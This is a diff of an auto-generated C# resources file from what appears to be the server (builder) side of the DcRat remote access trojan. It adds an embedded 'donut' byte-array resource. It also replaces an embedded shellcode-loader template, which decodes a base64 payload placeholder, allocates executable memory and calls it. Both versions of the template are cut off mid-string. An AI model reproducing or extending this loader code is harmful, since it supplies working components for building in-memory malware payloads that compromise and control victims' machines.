@@ -131,6 +131,16 @@ namespace Server.Properties {
         }
         
         /// <summary>
+        ///   查找 System.Byte[] 类型的本地化资源。
+        /// </summary>
+        public static byte[] donut {
+            get {
+                object obj = ResourceManager.GetObject("donut", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   查找 System.Drawing.Bitmap 类型的本地化资源。
         /// </summary>
         public static System.Drawing.Bitmap keyboard {
@@ -240,22 +250,27 @@ namespace Server.Properties {
         
         /// <summary>
         ///   查找类似 using System;
+        ///using System.Collections.Generic;
+        ///using System.ComponentModel;
+        ///using System.Linq;
         ///using System.Runtime.InteropServices;
+        ///using System.Text;
         ///
-        ///namespace DcRat_Shellcode_Loader
+        ///namespace Shellcode
         ///{
-        ///    public class ShellCode
+        ///    class Program
         ///    {
-        ///        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        ///        private delegate int Run();
-        ///
-        ///        public static bool ShellCodeExecute(byte[] ShellCode)
+        ///        static void Main(string[] args)
         ///        {
-        ///            try
-        ///            {
-        ///                GCHandle pinnedArray = GCHandle.Alloc(ShellCode, GCHandleType.Pinned);
-        ///                IntPtr ptr = pinnedArray.AddrOfPinnedObject();
-        ///                Marshal.Co [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        ///            byte[] buf = Convert.FromBase64String(&quot;%qwqdanchun%&quot;);
+        ///
+        ///
+        ///            IntPtr shellcode = NativeCaller.AllocateExecutableCode(IntPtr.Zero, buf);
+        ///
+        ///            NativeCaller.Call(shellcode);
+        ///        }
+        ///    }
+        ///    internal static class N [字符串的其余部分被截断]&quot;; 的本地化字符串。
         /// </summary>
         public static string ShellcodeLoader {
             get {
